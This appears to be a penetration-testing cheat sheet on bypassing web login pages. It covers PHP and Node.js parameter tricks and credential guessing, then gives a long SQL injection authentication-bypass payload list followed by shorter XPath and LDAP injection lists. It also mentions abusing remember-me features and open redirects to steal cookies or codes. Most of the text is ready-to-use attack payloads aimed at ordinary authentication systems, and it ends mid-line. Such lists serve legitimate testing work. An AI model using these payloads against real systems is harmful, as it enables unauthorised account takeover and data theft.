# Login Bypass
## Bypass regular login
If you find a login page, here you can find some techniques to try to bypass it:
* Check for `comments` inside the page (scroll down and to the right?)
* Check if you can directly access the restricted pages
* Check to not send the parameters (do not send any or only 1)
* Check the PHP comparisons error: `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
* Change content type to json and send json values (bool true included)
  * If you get a response saying that `POST` is not supported you can try to send the `JSON` in the body but with a `GET` request with `Content-Type: application/json`
* Check nodejs potential parsing error (read [this](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
  * Nodejs will transform that payload to a query similar to the following one:
    ```sql
    SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` ``password=password=1; 
    ```
    which makes the password bit to be always true
  * If you can send a JSON object you can send "password":{"password": 1} to bypass the login
  * Remember that to bypass this login you still need to know and send a valid username
  * Adding `"stringifyObjects":true` option when calling `mysql.createConnection` will eventually block all unexpected behaviours when `Object` is passed in the parameter
* Check credentials:
  * Default credentials of the technology/platform used
  * Common combinations (root, admin, password, name of the tech, default user with one of these passwords)
  * Create a dictionary using Cewl, add the default username and password (if there is) and try to brute-force it using all the words as usernames and password
  * Brute-force using a bigger dictionary (Brute force)

## SQL Injection authentication bypass
In the following you can find a custom list to try to bypass login via SQL Injections:
```sql
admin
password
1234
123456
root
toor
test
guest
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
1234
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
and 1=1
and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
like '%'
or 0=0 --
or 0=0 #
or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
' or a=a–
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
') or ('x'='x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
"
'-- 2
"-- 2
'='
0'&lt;'2
"="
0"&lt;"2
')
")
')-- 2
')/*
')#
")-- 2
") #
")/*
')-('
')&('
')^('
')*('
')=('
0')&lt;('2
")-("
")&("
")^("
")*("
")=("
0")&lt;("2
'-''-- 2
'-''#
'-''/*
'&''-- 2
'&''#
'&''/*
'^''-- 2
'^''#
'^''/*
'*''-- 2
'*''#
'*''/*
'=''-- 2
'=''#
'=''/*
0'&lt;'2'-- 2
0'&lt;'2'#
0'&lt;'2'/*
"-""-- 2
"-""#
"-""/*
"&""-- 2
"&""#
"&""/*
"^""-- 2
"^""#
"^""/*
"*""-- 2
"*""#
"*""/*
"=""-- 2
"=""#
"=""/*
0"&lt;"2"-- 2
0"&lt;"2"#
0"&lt;"2"/*
')-''-- 2
')-''#
')-''/*
')&''-- 2
')&''#
')&''/*
')^''-- 2
')^''#
')^''/*
')*''-- 2
')*''#
')*''/*
')=''-- 2
')=''#
')=''/*
0')&lt;'2'-- 2
0')&lt;'2'#
0')&lt;'2'/*
")-""-- 2
")-""#
")-""/*
")&""-- 2
")&""#
")&""/*
")^""-- 2
")^""#
")^""/*
")*""-- 2
")*""#
")*""/*
")=""-- 2
")=""#
")=""/*
0")&lt;"2-- 2
0")&lt;"2#
0")&lt;"2/*
'oR'2
'oR'2'-- 2
'oR'2'#
'oR'2'/*
'oR'2'oR'
'oR(2)-- 2
'oR(2)#
'oR(2)/*
'oR(2)oR'
'oR 2-- 2
'oR 2#
'oR 2/*
'oR 2 oR'
'oR/**/2-- 2
'oR/**/2#
'oR/**/2/*
'oR/**/2/**/oR'
"oR"2
"oR"2"-- 2
"oR"2"#
"oR"2"/*
"oR"2"oR"
"oR(2)-- 2
"oR(2)#
"oR(2)/*
"oR(2)oR"
"oR 2-- 2
"oR 2#
"oR 2/*
"oR 2 oR"
"oR/**/2-- 2
"oR/**/2#
"oR/**/2/*
"oR/**/2/**/oR"
'oR'2'='2
'oR'2'='2'oR'
'oR'2'='2'-- 2
'oR'2'='2'#
'oR'2'='2'/*
'oR 2=2-- 2
'oR 2=2#
'oR 2=2/*
'oR 2=2 oR'
'oR/**/2=2-- 2
'oR/**/2=2#
'oR/**/2=2/*
'oR/**/2=2/**/oR'
'oR(2)=2-- 2
'oR(2)=2#
'oR(2)=2/*
'oR(2)=(2)oR'
'oR'2'='2' LimIT 1-- 2
'oR'2'='2' LimIT 1#
'oR'2'='2' LimIT 1/*
'oR(2)=(2)LimIT(1)-- 2
'oR(2)=(2)LimIT(1)#
'oR(2)=(2)LimIT(1)/*
"oR"2"="2
"oR"2"="2"oR"
"oR"2"="2"-- 2
"oR"2"="2"#
"oR"2"="2"/*
"oR 2=2-- 2
"oR 2=2#
"oR 2=2/*
"oR 2=2 oR"
"oR/**/2=2-- 2
"oR/**/2=2#
"oR/**/2=2/*
"oR/**/2=2/**/oR"
"oR(2)=2-- 2
"oR(2)=2#
"oR(2)=2/*
"oR(2)=(2)oR"
"oR"2"="2" LimIT 1-- 2
"oR"2"="2" LimIT 1#
"oR"2"="2" LimIT 1/*
"oR(2)=(2)LimIT(1)-- 2
"oR(2)=(2)LimIT(1)#
"oR(2)=(2)LimIT(1)/*
'oR true-- 2
'oR true#
'oR true/*
'oR true oR'
'oR(true)-- 2
'oR(true)#
'oR(true)/*
'oR(true)oR'
'oR/**/true-- 2
'oR/**/true#
'oR/**/true/*
'oR/**/true/**/oR'
"oR true-- 2
"oR true#
"oR true/*
"oR true oR"
"oR(true)-- 2
"oR(true)#
"oR(true)/*
"oR(true)oR"
"oR/**/true-- 2
"oR/**/true#
"oR/**/true/*
"oR/**/true/**/oR"
'oR'2'LiKE'2
'oR'2'LiKE'2'-- 2
'oR'2'LiKE'2'#
'oR'2'LiKE'2'/*
'oR'2'LiKE'2'oR'
'oR(2)LiKE(2)-- 2
'oR(2)LiKE(2)#
'oR(2)LiKE(2)/*
'oR(2)LiKE(2)oR'
"oR"2"LiKE"2
"oR"2"LiKE"2"-- 2
"oR"2"LiKE"2"#
"oR"2"LiKE"2"/*
"oR"2"LiKE"2"oR"
"oR(2)LiKE(2)-- 2
"oR(2)LiKE(2)#
"oR(2)LiKE(2)/*
"oR(2)LiKE(2)oR"
admin
admin'-- 2
admin'#
admin"-- 2
admin"#
ffifdyop
' UniON SElecT 1,2-- 2
' UniON SElecT 1,2,3-- 2
' UniON SElecT 1,2,3,4-- 2
' UniON SElecT 1,2,3,4,5-- 2
' UniON SElecT 1,2#
' UniON SElecT 1,2,3#
' UniON SElecT 1,2,3,4#
' UniON SElecT 1,2,3,4,5#
'UniON(SElecT(1),2)-- 2
'UniON(SElecT(1),2,3)-- 2
'UniON(SElecT(1),2,3,4)-- 2
'UniON(SElecT(1),2,3,4,5)-- 2
'UniON(SElecT(1),2)#
'UniON(SElecT(1),2,3)#
'UniON(SElecT(1),2,3,4)#
'UniON(SElecT(1),2,3,4,5)#
" UniON SElecT 1,2-- 2
" UniON SElecT 1,2,3-- 2
" UniON SElecT 1,2,3,4-- 2
" UniON SElecT 1,2,3,4,5-- 2
" UniON SElecT 1,2#
" UniON SElecT 1,2,3#
" UniON SElecT 1,2,3,4#
" UniON SElecT 1,2,3,4,5#
"UniON(SElecT(1),2)-- 2
"UniON(SElecT(1),2,3)-- 2
"UniON(SElecT(1),2,3,4)-- 2
"UniON(SElecT(1),2,3,4,5)-- 2
"UniON(SElecT(1),2)#
"UniON(SElecT(1),2,3)#
"UniON(SElecT(1),2,3,4)#
"UniON(SElecT(1),2,3,4,5)#
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
"||"2
"||2-- 2
"||"2"||"
"||2#
"||2/*
"||2||"
'||'2'='2
'||'2'='2'||'
'||2=2-- 2
'||2=2#
'||2=2/*
'||2=2||'
"||"2"="2
"||"2"="2"||"
"||2=2-- 2
"||2=2#
"||2=2/*
"||2=2||"
'||2=(2)LimIT(1)-- 2
'||2=(2)LimIT(1)#
'||2=(2)LimIT(1)/*
"||2=(2)LimIT(1)-- 2
"||2=(2)LimIT(1)#
"||2=(2)LimIT(1)/*
'||true-- 2
'||true#
'||true/*
'||true||'
"||true-- 2
"||true#
"||true/*
"||true||"
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||'2'LiKE'2'#
'||'2'LiKE'2'/*
'||'2'LiKE'2'||'
'||(2)LiKE(2)-- 2
'||(2)LiKE(2)#
'||(2)LiKE(2)/*
'||(2)LiKE(2)||'
"||"2"LiKE"2
"||"2"LiKE"2"-- 2
"||"2"LiKE"2"#
"||"2"LiKE"2"/*
"||"2"LiKE"2"||"
"||(2)LiKE(2)-- 2
"||(2)LiKE(2)#
"||(2)LiKE(2)/*
"||(2)LiKE(2)||"
')oR('2
')oR'2'-- 2
')oR'2'#
')oR'2'/*
')oR'2'oR('
')oR(2)-- 2
')oR(2)#
')oR(2)/*
')oR(2)oR('
')oR 2-- 2
')oR 2#
')oR 2/*
')oR 2 oR('
')oR/**/2-- 2
')oR/**/2#
')oR/**/2/*
')oR/**/2/**/oR('
")oR("2
")oR"2"-- 2
")oR"2"#
")oR"2"/*
")oR"2"oR("
")oR(2)-- 2
")oR(2)#
")oR(2)/*
")oR(2)oR("
")oR 2-- 2
")oR 2#
")oR 2/*
")oR 2 oR("
")oR/**/2-- 2
")oR/**/2#
")oR/**/2/*
")oR/**/2/**/oR("
')oR'2'=('2
')oR'2'='2'oR('
')oR'2'='2'-- 2
')oR'2'='2'#
')oR'2'='2'/*
')oR 2=2-- 2
')oR 2=2#
')oR 2=2/*
')oR 2=2 oR('
')oR/**/2=2-- 2
')oR/**/2=2#
')oR/**/2=2/*
')oR/**/2=2/**/oR('
')oR(2)=2-- 2
')oR(2)=2#
')oR(2)=2/*
')oR(2)=(2)oR('
')oR'2'='2' LimIT 1-- 2
')oR'2'='2' LimIT 1#
')oR'2'='2' LimIT 1/*
')oR(2)=(2)LimIT(1)-- 2
')oR(2)=(2)LimIT(1)#
')oR(2)=(2)LimIT(1)/*
")oR"2"=("2
")oR"2"="2"oR("
")oR"2"="2"-- 2
")oR"2"="2"#
")oR"2"="2"/*
")oR 2=2-- 2
")oR 2=2#
")oR 2=2/*
")oR 2=2 oR("
")oR/**/2=2-- 2
")oR/**/2=2#
")oR/**/2=2/*
")oR/**/2=2/**/oR("
")oR(2)=2-- 2
")oR(2)=2#
")oR(2)=2/*
")oR(2)=(2)oR("
")oR"2"="2" LimIT 1-- 2
")oR"2"="2" LimIT 1#
")oR"2"="2" LimIT 1/*
")oR(2)=(2)LimIT(1)-- 2
")oR(2)=(2)LimIT(1)#
")oR(2)=(2)LimIT(1)/*
')oR true-- 2
')oR true#
')oR true/*
')oR true oR('
')oR(true)-- 2
')oR(true)#
')oR(true)/*
')oR(true)oR('
')oR/**/true-- 2
')oR/**/true#
')oR/**/true/*
')oR/**/true/**/oR('
")oR true-- 2
")oR true#
")oR true/*
")oR true oR("
")oR(true)-- 2
")oR(true)#
")oR(true)/*
")oR(true)oR("
")oR/**/true-- 2
")oR/**/true#
")oR/**/true/*
")oR/**/true/**/oR("
')oR'2'LiKE('2
')oR'2'LiKE'2'-- 2
')oR'2'LiKE'2'#
')oR'2'LiKE'2'/*
')oR'2'LiKE'2'oR('
')oR(2)LiKE(2)-- 2
')oR(2)LiKE(2)#
')oR(2)LiKE(2)/*
')oR(2)LiKE(2)oR('
")oR"2"LiKE("2
")oR"2"LiKE"2"-- 2
")oR"2"LiKE"2"#
")oR"2"LiKE"2"/*
")oR"2"LiKE"2"oR("
")oR(2)LiKE(2)-- 2
")oR(2)LiKE(2)#
")oR(2)LiKE(2)/*
")oR(2)LiKE(2)oR("
admin')-- 2
admin')#
admin')/*
admin")-- 2
admin")#
') UniON SElecT 1,2-- 2
') UniON SElecT 1,2,3-- 2
') UniON SElecT 1,2,3,4-- 2
') UniON SElecT 1,2,3,4,5-- 2
') UniON SElecT 1,2#
') UniON SElecT 1,2,3#
') UniON SElecT 1,2,3,4#
') UniON SElecT 1,2,3,4,5#
')UniON(SElecT(1),2)-- 2
')UniON(SElecT(1),2,3)-- 2
')UniON(SElecT(1),2,3,4)-- 2
')UniON(SElecT(1),2,3,4,5)-- 2
')UniON(SElecT(1),2)#
')UniON(SElecT(1),2,3)#
')UniON(SElecT(1),2,3,4)#
')UniON(SElecT(1),2,3,4,5)#
") UniON SElecT 1,2-- 2
") UniON SElecT 1,2,3-- 2
") UniON SElecT 1,2,3,4-- 2
") UniON SElecT 1,2,3,4,5-- 2
") UniON SElecT 1,2#
") UniON SElecT 1,2,3#
") UniON SElecT 1,2,3,4#
") UniON SElecT 1,2,3,4,5#
")UniON(SElecT(1),2)-- 2
")UniON(SElecT(1),2,3)-- 2
")UniON(SElecT(1),2,3,4)-- 2
")UniON(SElecT(1),2,3,4,5)-- 2
")UniON(SElecT(1),2)#
")UniON(SElecT(1),2,3)#
")UniON(SElecT(1),2,3,4)#
")UniON(SElecT(1),2,3,4,5)#
')||('2
')||2-- 2
')||'2'||('
')||2#
')||2/*
')||2||('
")||("2
")||2-- 2
")||"2"||("
")||2#
")||2/*
")||2||("
')||'2'=('2
')||'2'='2'||('
')||2=2-- 2
')||2=2#
')||2=2/*
')||2=2||('
")||"2"=("2
")||"2"="2"||("
")||2=2-- 2
")||2=2#
")||2=2/*
")||2=2||("
')||2=(2)LimIT(1)-- 2
')||2=(2)LimIT(1)#
')||2=(2)LimIT(1)/*
")||2=(2)LimIT(1)-- 2
")||2=(2)LimIT(1)#
")||2=(2)LimIT(1)/*
')||true-- 2
')||true#
')||true/*
')||true||('
")||true-- 2
")||true#
")||true/*
")||true||("
')||'2'LiKE('2
')||'2'LiKE'2'-- 2
')||'2'LiKE'2'#
')||'2'LiKE'2'/*
')||'2'LiKE'2'||('
')||(2)LiKE(2)-- 2
')||(2)LiKE(2)#
')||(2)LiKE(2)/*
')||(2)LiKE(2)||('
")||"2"LiKE("2
")||"2"LiKE"2"-- 2
")||"2"LiKE"2"#
")||"2"LiKE"2"/*
")||"2"LiKE"2"||("
")||(2)LiKE(2)-- 2
")||(2)LiKE(2)#
")||(2)LiKE(2)/*
")||(2)LiKE(2)||("
' UnION SELeCT 1,2`
' UnION SELeCT 1,2,3`
' UnION SELeCT 1,2,3,4`
' UnION SELeCT 1,2,3,4,5`
" UnION SELeCT 1,2`
" UnION SELeCT 1,2,3`
" UnION SELeCT 1,2,3,4`
" UnION SELeCT 1,2,3,4,5`
' or 1=1 limit 1 -- -+
'="or'
Pass1234.
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
%A8%27 Or 1=1-- 2
%8C%A8%27 Or 1=1-- 2
%bf' Or 1=1 -- 2
%A8%27 Or 1-- 2
%8C%A8%27 Or 1-- 2
%bf' Or 1-- 2
%A8%27Or(1)-- 2
%8C%A8%27Or(1)-- 2
%bf'Or(1)-- 2
%A8%27||1-- 2
%8C%A8%27||1-- 2
%bf'||1-- 2
%A8%27) Or 1=1-- 2
%8C%A8%27) Or 1=1-- 2
%bf') Or 1=1 -- 2
%A8%27) Or 1-- 2
%8C%A8%27) Or 1-- 2
%bf') Or 1-- 2
%A8%27)Or(1)-- 2
%8C%A8%27)Or(1)-- 2
%bf')Or(1)-- 2
%A8%27)||1-- 2
%8C%A8%27)||1-- 2
%bf')||1-- 2
```

## No SQL Injection authentication bypass
As the NoSQL Injections requires to change the parameters value, you will need to test them manually.

## XPath Injection authentication bypass
```sql
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

## LDAP Injection authentication bypass
```sql
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

## Remember Me
If the page has "Remember Me" functionality check how is it implemented and see if you can abuse it to takeover other accounts.

## Redirects
Pages usually redirects users after login, check if you can alter that redirect to cause an Open Redirect. Maybe you can steal some information (codes, cookies...) if you redirect the user to your web.

## Other Checks
* Check if you can enumerate usernames abusing the login functionality.
* Check if auto-complete is active in the password/sensitive information forms input: <input autocomplete="false"




















































